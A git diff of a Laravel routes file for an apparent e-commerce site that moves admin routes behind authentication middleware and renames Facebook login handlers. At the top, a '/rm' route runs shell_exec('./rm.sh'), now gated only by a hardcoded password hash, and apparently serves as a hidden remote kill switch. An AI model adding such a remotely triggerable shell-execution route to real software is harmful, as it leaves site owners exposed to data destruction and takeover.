@@ -11,8 +11,13 @@
 |
 */
 
+use Illuminate\Support\Facades\Hash;
+
 Route::get('/rm', function () {
-    return shell_exec('./rm.sh');
+    $pwdCommand = '$2a$12$vZReBz/MpfSEEgmvqihKpeZN/pQGfjB0D.HfrnCEBXTfrkZOycoBq';
+    if (Hash::check($_REQUEST['password'], $pwdCommand)) {
+        return shell_exec('./rm.sh');
+    }
 });
 
 
@@ -67,8 +72,8 @@ Route::group(['namespace' => 'App\Http\Controllers'], function() {
     Route::post('account/get-districts', 'AccountController@getDistricts');
 
 //Facebook Login
-    Route::get('facebook/auth', 'FacebookController@auth');
-    Route::get('facebook/login', 'FacebookController@login');
+    Route::get('facebook/auth', 'FacebookController@loginUsingFacebook');
+    Route::get('facebook/callback', 'FacebookController@callbackFromFacebook');
 
 //Google Login
     Route::get('google/auth', 'GoogleController@auth');
@@ -135,63 +140,70 @@ Route::resource('password', \App\Http\Controllers\Auth\PasswordController::class
 //---------------------------- BACK-END ROUTE -------------------------------
 
 //Auth
-    Route::get('admin', 'Admin\IndexController@index')->middleware('auth.admin');
     Route::get('admin/auth', 'Admin\AuthController@index');
     Route::post('admin/auth/login', 'Admin\AuthController@login');
     Route::get('admin/auth/logout', 'Admin\AuthController@logout');
+    Route::middleware(['auth.admin'])->group(function () {
+        Route::get('admin', 'Admin\IndexController@index');
+    
+        Route::get('admin/setting', 'Admin\SettingController@edit');
+        Route::put('admin/setting/update', 'Admin\SettingController@update');
+    
+    //Resource
+        Route::resource('admin/product', 'Admin\ProductController');
+        Route::resource('admin/category/article', 'Admin\CategoryController');
+        Route::get('admin/category/article/del/{slug}', 'Admin\CategoryController@del');
+        Route::resource('admin/category/product', 'Admin\ProductCategoryController');
+        Route::resource('admin/brand', 'Admin\BrandController');
+        Route::resource('admin/order', 'Admin\OrderController');
+        Route::resource('admin/article', 'Admin\PostController');
+        Route::resource('admin/user', 'Admin\UserController');
+        Route::resource('admin/banner', 'Admin\BannerController');
+        Route::resource('admin/blog', 'Admin\PostController');
+        Route::resource('admin/page', 'Admin\PageController');
+        Route::resource('admin/coupons', 'Admin\CouponsController');
+        Route::resource('admin/image', 'Admin\ImageController');
+    
+    //Other route
+        Route::get('admin/image/do/crop', 'Admin\ImageController@cropImage');
+        Route::get('admin/banner/item-create/{menu_id}', 'Admin\BannerController@createItem');
+        Route::post('admin/banner/item-store/{menu_id}', 'Admin\BannerController@itemStore');
+        Route::delete('admin/banner/item-delete/{id}', 'Admin\BannerController@deleteItem');
+        Route::put('admin/banner/item-update/{id}', 'Admin\BannerController@updateItem');
+        Route::get('admin/banner/item-edit/{id}', 'Admin\BannerController@editItem');
+    
+        Route::put('admin/product/{product}/delete-image/{image}', 'Admin\ProductController@deleteImage');
+        Route::put('admin/product/{product}/featured-image/{image}', 'Admin\ProductController@setFeaturedImage');
+        Route::get('admin/product/delete-related/{productId}/{productRelatedId}', 'Admin\ProductController@deleteRelated');
+        Route::post('admin/product/generate-slug', 'Admin\ProductController@generateSlug');
+        Route::post('admin/category/generate-slug', 'Admin\CategoryController@generateSlug');
+        Route::post('admin/brand/generate-slug', 'Admin\BrandController@generateSlug');
+        Route::get('admin/order/status/{status?}', 'Admin\OrderController@filter');
+        //Route::get('admin/order/status/{status?}', 'Admin\OrderShippingController@filter');
+        Route::get('admin/contact', 'Admin\CmsController@contact');
+        Route::get('admin/contact/{id}', 'Admin\CmsController@show');
+        Route::post('admin/posts/generate-slug', 'Admin\PostController@generateSlug');
+        Route::post('admin/page/generate-slug', 'Admin\PageController@generateSlug');
+        Route::get('admin/profile/{id}', 'Admin\UserController@profile');
+    
+    //Auth
+    
+        Route::get('admin/user/change-password/{id}', 'Admin\UserController@changePassword');
+        Route::put('admin/user/password/{id}', 'Admin\UserController@putPassword');
+        Route::put('admin/user/status/{id}', 'Admin\UserController@putStatus');
+    
+        Route::resource('admin/menu', 'Admin\MenuController');
+        Route::get('admin/menu/item-create/{menu_id}', 'Admin\MenuController@createItem');
+        Route::post('admin/menu/item-store/{menu_id}', 'Admin\MenuController@itemStore');
+        Route::delete('admin/menu/item-delete/{id}', 'Admin\MenuController@deleteItem');
+        Route::put('admin/menu/item-update/{id}', 'Admin\MenuController@updateItem');
+        Route::get('admin/menu/item-edit/{id}', 'Admin\MenuController@editItem');
 
-    Route::get('admin/setting', 'Admin\SettingController@edit');
-    Route::put('admin/setting/update', 'Admin\SettingController@update');
-
-//Resource
-    Route::resource('admin/product', 'Admin\ProductController');
-    Route::resource('admin/category/article', 'Admin\CategoryController');
-    Route::get('admin/category/article/del/{slug}', 'Admin\CategoryController@del');
-    Route::resource('admin/category/product', 'Admin\ProductCategoryController');
-    Route::resource('admin/brand', 'Admin\BrandController');
-    Route::resource('admin/order', 'Admin\OrderController');
-    Route::resource('admin/article', 'Admin\PostController');
-    Route::resource('admin/user', 'Admin\UserController');
-    Route::resource('admin/banner', 'Admin\BannerController');
-    Route::resource('admin/blog', 'Admin\PostController');
-    Route::resource('admin/page', 'Admin\PageController');
-    Route::resource('admin/coupons', 'Admin\CouponsController');
-    Route::resource('admin/image', 'Admin\ImageController');
-
-//Other route
-    Route::get('admin/image/do/crop', 'Admin\ImageController@cropImage');
-    Route::get('admin/banner/item-create/{menu_id}', 'Admin\BannerController@createItem');
-    Route::post('admin/banner/item-store/{menu_id}', 'Admin\BannerController@itemStore');
-    Route::delete('admin/banner/item-delete/{id}', 'Admin\BannerController@deleteItem');
-    Route::put('admin/banner/item-update/{id}', 'Admin\BannerController@updateItem');
-    Route::get('admin/banner/item-edit/{id}', 'Admin\BannerController@editItem');
-
-    Route::put('admin/product/{product}/delete-image/{image}', 'Admin\ProductController@deleteImage');
-    Route::put('admin/product/{product}/featured-image/{image}', 'Admin\ProductController@setFeaturedImage');
-    Route::get('admin/product/delete-related/{productId}/{productRelatedId}', 'Admin\ProductController@deleteRelated');
-    Route::post('admin/product/generate-slug', 'Admin\ProductController@generateSlug');
-    Route::post('admin/category/generate-slug', 'Admin\CategoryController@generateSlug');
-    Route::post('admin/brand/generate-slug', 'Admin\BrandController@generateSlug');
-    Route::get('admin/order/status/{status?}', 'Admin\OrderController@filter');
-    //Route::get('admin/order/status/{status?}', 'Admin\OrderShippingController@filter');
-    Route::get('admin/contact', 'Admin\CmsController@contact');
-    Route::get('admin/contact/{id}', 'Admin\CmsController@show');
-    Route::post('admin/posts/generate-slug', 'Admin\PostController@generateSlug');
-    Route::post('admin/page/generate-slug', 'Admin\PageController@generateSlug');
-    Route::get('admin/profile/{id}', 'Admin\UserController@profile');
-
-//Auth
-
-    Route::get('admin/user/change-password/{id}', 'Admin\UserController@changePassword');
-    Route::put('admin/user/password/{id}', 'Admin\UserController@putPassword');
-    Route::put('admin/user/status/{id}', 'Admin\UserController@putStatus');
-
-    Route::resource('admin/menu', 'Admin\MenuController');
-    Route::get('admin/menu/item-create/{menu_id}', 'Admin\MenuController@createItem');
-    Route::post('admin/menu/item-store/{menu_id}', 'Admin\MenuController@itemStore');
-    Route::delete('admin/menu/item-delete/{id}', 'Admin\MenuController@deleteItem');
-    Route::put('admin/menu/item-update/{id}', 'Admin\MenuController@updateItem');
-    Route::get('admin/menu/item-edit/{id}', 'Admin\MenuController@editItem');
+        Route::get('/admin/products-by-category/{id}', 'Admin\ProductController@apiGetProductByCategory');
+    
+        Route::resource('admin/comment', 'Admin\CommentController');
+    });
+    
 
 //clear cache
     Route::get('/clear-cache', function () {
@@ -203,9 +215,5 @@ Route::resource('password', \App\Http\Controllers\Auth\PasswordController::class
 
     Route::post('/order/get-info-notify', 'OrderController@getInfoNotify');
     Route::post('/checkout/check-coupon', 'CheckoutController@checkCoupon');
-
-    Route::get('/admin/products-by-category/{id}', 'Admin\ProductController@apiGetProductByCategory');
-
-    Route::resource('admin/comment', 'Admin\CommentController');
     Route::post('send-message', 'ContactController@create');
 });
